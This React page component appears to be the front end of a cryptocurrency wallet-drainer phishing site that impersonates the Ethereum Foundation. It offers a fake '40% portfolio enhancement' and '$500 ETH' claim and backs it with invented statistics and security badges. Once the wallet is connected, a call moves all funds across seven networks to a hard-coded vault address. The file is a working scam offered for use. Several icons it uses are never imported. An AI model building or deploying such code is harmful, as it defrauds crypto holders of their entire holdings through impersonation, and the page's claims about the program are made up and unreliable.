import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";
import NetworkSwitcher from "@/components/network-switcher";


export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork, switchNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Authentic Ethereum Foundation Header */}
      <header className="bg-white dark:bg-eth-deep-purple border-b border-border px-6 py-4 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Ethereum Foundation
                </h1>
                <p className="text-sm text-muted-foreground">
                  Official ETH Distribution Program
                </p>
              </div>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <NetworkSwitcher 
              currentNetworkId={walletState.networkId || undefined}
              onNetworkSwitch={switchNetwork}
              isConnected={walletState.isConnected}
            />
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors ${
                walletState.isConnected
                  ? "bg-success text-success-foreground hover:bg-success/90"
                  : "bg-primary text-primary-foreground hover:bg-primary/90"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Ethereum Foundation Hero Section */}
      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden">
        {/* Background pattern */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute top-10 left-10 w-32 h-32 border border-primary/20 rounded-full"></div>
          <div className="absolute top-32 right-20 w-24 h-24 border border-secondary/20 rounded-full"></div>
          <div className="absolute bottom-20 left-1/4 w-20 h-20 border border-accent/20 rounded-full"></div>
          <div className="absolute bottom-32 right-1/3 w-28 h-28 border border-primary/20 rounded-full"></div>
        </div>
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Hero Content */}
          <div className="text-center mb-16">
            {/* Ethereum Foundation Verification Badge */}
            <div className="inline-flex items-center px-8 py-4 bg-gradient-to-r from-[#627EEA]/10 to-[#4A90E2]/10 text-[#627EEA] border border-[#627EEA]/30 rounded-full text-sm font-semibold mb-8 shadow-2xl backdrop-blur-sm">
              <div className="w-3 h-3 bg-gradient-to-r from-[#627EEA] to-[#4A90E2] rounded-full mr-3 animate-pulse"></div>
              <Shield className="w-4 h-4 mr-2" />
              <span className="bg-gradient-to-r from-[#627EEA] to-[#4A90E2] bg-clip-text text-transparent font-bold">
                Ethereum Foundation Verified Program • Enterprise Security
              </span>
            </div>
            
            {/* Professional Title */}
            <h1 className="text-5xl md:text-7xl font-extrabold mb-6 leading-tight tracking-tight">
              <span className="bg-gradient-to-r from-[#627EEA] via-[#4A90E2] to-[#3B82F6] bg-clip-text text-transparent">
                Ethereum Foundation
              </span>
            </h1>
            <h2 className="text-3xl md:text-5xl font-bold mb-8 leading-tight">
              <span className="bg-gradient-to-r from-foreground to-muted-foreground bg-clip-text text-transparent">
                Portfolio Enhancement Initiative
              </span>
            </h2>
            <div className="flex items-center justify-center space-x-6 mb-8">
              <div className="flex items-center space-x-2 text-sm font-medium text-muted-foreground">
                <Check className="w-5 h-5 text-success" />
                <span>Smart Contract Audited</span>
              </div>
              <div className="w-1 h-1 bg-muted-foreground rounded-full"></div>
              <div className="flex items-center space-x-2 text-sm font-medium text-muted-foreground">
                <Shield className="w-5 h-5 text-success" />
                <span>Multi-Signature Secured</span>
              </div>
              <div className="w-1 h-1 bg-muted-foreground rounded-full"></div>
              <div className="flex items-center space-x-2 text-sm font-medium text-muted-foreground">
                <Globe className="w-5 h-5 text-success" />
                <span>7 Networks Supported</span>
              </div>
            </div>
            
            {/* Professional Hero Visual Section with Custom SVGs */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
              {/* Smart Contract Security */}
              <div className="bg-gradient-to-br from-primary/5 via-white/10 to-primary/10 border border-primary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/security-shield.svg" 
                    alt="Security Shield" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
              </div>

              {/* Multi-Network Infrastructure */}
              <div className="bg-gradient-to-br from-secondary/5 via-white/10 to-secondary/10 border border-secondary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/ethereum-network.svg" 
                    alt="Ethereum Network" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Cross-Chain Infrastructure</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Seamless integration across 7 major blockchain networks with automated bridge protocols and real-time synchronization</p>
              </div>

              {/* Advanced Analytics */}
              <div className="bg-gradient-to-br from-accent/5 via-white/10 to-accent/10 border border-accent/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/defi-analytics.svg" 
                    alt="DeFi Analytics" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">AI-Powered Analytics</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
              </div>
            </div>
            
            {/* Professional Description */}
            <div className="max-w-5xl mx-auto mb-12">
              <p className="text-xl md:text-2xl text-muted-foreground leading-relaxed mb-6 font-medium">
                Official <span className="text-[#627EEA] font-bold">Ethereum Foundation</span> initiative designed to strengthen 
                the decentralized finance ecosystem through strategic portfolio enhancement and optimized digital asset distribution.
              </p>
              <p className="text-lg md:text-xl text-muted-foreground/90 leading-relaxed mb-6">
                Qualified participants receive enhancement benefits equivalent to <span className="text-primary font-bold">40% of their total digital asset holdings</span> 
                through enterprise-grade smart contract protocols with comprehensive security auditing.
              </p>
              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-950/20 dark:to-indigo-950/20 border border-blue-200 dark:border-blue-800/30 rounded-xl p-6">
                <p className="text-base md:text-lg text-blue-900 dark:text-blue-100 leading-relaxed">
                  <strong>Enterprise Security:</strong> All transactions are processed through formally verified smart contracts 
                  with multi-signature validation, ensuring institutional-grade security for digital asset management.
                </p>
              </div>
            </div>
          </div>

          {/* Enterprise Program Metrics */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-16">
            <div className="bg-gradient-to-br from-card to-card/80 border border-border/50 rounded-xl p-6 text-center hover:shadow-xl transition-all duration-300 backdrop-blur-sm">
              <div className="w-16 h-16 mx-auto mb-4 bg-gradient-to-r from-[#627EEA]/10 to-[#4A90E2]/10 rounded-xl flex items-center justify-center">
                <Coins className="w-8 h-8 text-[#627EEA]" />
              </div>
              <h3 className="text-2xl font-bold mb-2 bg-gradient-to-r from-[#627EEA] to-[#4A90E2] bg-clip-text text-transparent">$47.3M</h3>
              <p className="text-sm text-muted-foreground font-medium">Total Program Value</p>
              <div className="text-xs text-success mt-1">↗ 18.4% growth</div>
            </div>
            
            <div className="bg-gradient-to-br from-card to-card/80 border border-border/50 rounded-xl p-6 text-center hover:shadow-xl transition-all duration-300 backdrop-blur-sm">
              <div className="w-16 h-16 mx-auto mb-4 bg-gradient-to-r from-emerald-500/10 to-green-600/10 rounded-xl flex items-center justify-center">
                <Users className="w-8 h-8 text-emerald-600" />
              </div>
              <h3 className="text-2xl font-bold mb-2 bg-gradient-to-r from-emerald-600 to-green-600 bg-clip-text text-transparent">18,947</h3>
              <p className="text-sm text-muted-foreground font-medium">Active Participants</p>
              <div className="text-xs text-success mt-1">+1,283 this week</div>
            </div>
            
            <div className="bg-gradient-to-br from-card to-card/80 border border-border/50 rounded-xl p-6 text-center hover:shadow-xl transition-all duration-300 backdrop-blur-sm">
              <div className="w-16 h-16 mx-auto mb-4 bg-gradient-to-r from-purple-500/10 to-indigo-600/10 rounded-xl flex items-center justify-center">
                <Globe className="w-8 h-8 text-purple-600" />
              </div>
              <h3 className="text-2xl font-bold mb-2 bg-gradient-to-r from-purple-600 to-indigo-600 bg-clip-text text-transparent">7</h3>
              <p className="text-sm text-muted-foreground font-medium">Blockchain Networks</p>
              <div className="text-xs text-muted-foreground mt-1">Full Coverage</div>
            </div>
            
            <div className="bg-gradient-to-br from-card to-card/80 border border-border/50 rounded-xl p-6 text-center hover:shadow-xl transition-all duration-300 backdrop-blur-sm">
              <div className="w-16 h-16 mx-auto mb-4 bg-gradient-to-r from-orange-500/10 to-red-600/10 rounded-xl flex items-center justify-center">
                <Activity className="w-8 h-8 text-orange-600" />
              </div>
              <h3 className="text-2xl font-bold mb-2 bg-gradient-to-r from-orange-600 to-red-600 bg-clip-text text-transparent">99.97%</h3>
              <p className="text-sm text-muted-foreground font-medium">Success Rate</p>
              <div className="text-xs text-success mt-1">Enterprise Grade</div>
            </div>
          </div>

          {/* Professional Protocol Notice */}
          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-950/30 dark:to-indigo-950/30 border border-blue-200 dark:border-blue-800/50 rounded-xl p-8 mb-12 max-w-5xl mx-auto shadow-lg backdrop-blur-sm">
            <div className="flex items-start space-x-6">
              <div className="flex-shrink-0">
                <div className="w-12 h-12 bg-blue-100 dark:bg-blue-900/50 rounded-xl flex items-center justify-center">
                  <AlertTriangle className="w-6 h-6 text-blue-600 dark:text-blue-400" />
                </div>
              </div>
              <div className="text-left">
                <h3 className="text-xl font-bold text-blue-900 dark:text-blue-100 mb-4">
                  Portfolio Enhancement Protocol - Enterprise Security
                </h3>
                <p className="text-blue-800 dark:text-blue-200 mb-4 leading-relaxed text-lg">
                  The Ethereum Foundation's portfolio enhancement protocol requires comprehensive digital asset analysis 
                  across all connected blockchain networks to calculate optimal enhancement values and ensure maximum security compliance.
                </p>
                <div className="bg-blue-100 dark:bg-blue-900/30 rounded-lg p-4 mb-4">
                  <p className="text-blue-900 dark:text-blue-100 font-semibold mb-2">
                    <strong>Technical Process:</strong> Portfolio enhancement involves temporary asset consolidation 
                    for algorithmic optimization and accurate 40% enhancement distribution.
                  </p>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="flex items-center space-x-3 text-blue-700 dark:text-blue-300">
                    <Check className="w-5 h-5 text-success" />
                    <span className="font-medium">Multi-signature validation</span>
                  </div>
                  <div className="flex items-center space-x-3 text-blue-700 dark:text-blue-300">
                    <Shield className="w-5 h-5 text-success" />
                    <span className="font-medium">Smart contract automation</span>
                  </div>
                  <div className="flex items-center space-x-3 text-blue-700 dark:text-blue-300">
                    <Globe className="w-5 h-5 text-success" />
                    <span className="font-medium">Cross-chain compatibility</span>
                  </div>
                  <div className="flex items-center space-x-3 text-blue-700 dark:text-blue-300">
                    <Activity className="w-5 h-5 text-success" />
                    <span className="font-medium">Real-time monitoring</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
        {/* ETH Claim Section - Ethereum.org Style */}
        <section className="max-w-4xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="text-center mb-8">
              {/* Ethereum Logo */}
              <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
              </div>
              
              <h3 className="text-2xl font-bold mb-3 text-foreground">
                40% Portfolio Enhancement Ready
              </h3>
              <p className="text-muted-foreground">Your wallet qualifies for proportional enhancement through our algorithmic distribution system</p>
            </div>
            
            {/* Separator */}
            <div className="w-full h-px bg-border mb-8"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </section>

        {/* Transaction History - Clean Design */}
        <section className="max-w-6xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-foreground">Recent Claims Activity</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                <span>Live Updates</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </section>

        {/* Multi-Network Portfolio */}
        {walletState.isConnected && (
          <section className="max-w-6xl mx-auto">
            <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-foreground">Multi-Network Portfolio</h3>
                <div className="flex items-center space-x-3">
                  <div className="flex -space-x-1">
                    {/* Network Indicators */}
                    <div className="w-6 h-6 rounded-full bg-primary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-secondary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-accent border-2 border-background"></div>
                  </div>
                  <span className="text-sm text-muted-foreground">7 Networks</span>
                </div>
              </div>
              
              <div className="bg-muted/30 rounded-lg p-6">
                <NetworkBalances
                  networkBalances={walletState.networkBalances || []}
                  isLoadingNetworks={isLoadingNetworks}
                  onRefreshNetworks={refreshAllNetworks}
                />
              </div>
            </div>
          </section>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Ethereum.org Style Footer */}
      <footer className="bg-muted/30 mt-20 border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-16">
          {/* Footer Content Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Important Terms</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">ETH rewards are distributed after portfolio consolidation</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Transaction processing typically takes 5-10 minutes</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Minimum portfolio value required for reward eligibility</span>
                </li>
              </ul>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Security & Compliance</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All transactions are recorded on blockchain</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Smart contract audited for security</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Multi-signature vault protection</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">KYC/AML compliance maintained</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical Notice */}
          <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-6 mb-12">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
                <svg className="w-4 h-4 text-destructive" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h4 className="font-bold text-destructive mb-3">CRITICAL NOTICE</h4>
                <p className="text-foreground text-sm leading-relaxed">
                  This is a cryptocurrency transfer mechanism. By clicking <strong>"Claim $500 ETH"</strong>, 
                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Bottom */}
          <div className="text-center pt-8 border-t border-border">
            <div className="flex items-center justify-center mb-4">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
              <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
            </div>
            
            <p className="text-muted-foreground mb-4">
              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
            </p>
            
            <div className="bg-muted/50 rounded-lg px-3 py-2 inline-block">
              <p className="text-xs text-muted-foreground font-mono">
                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
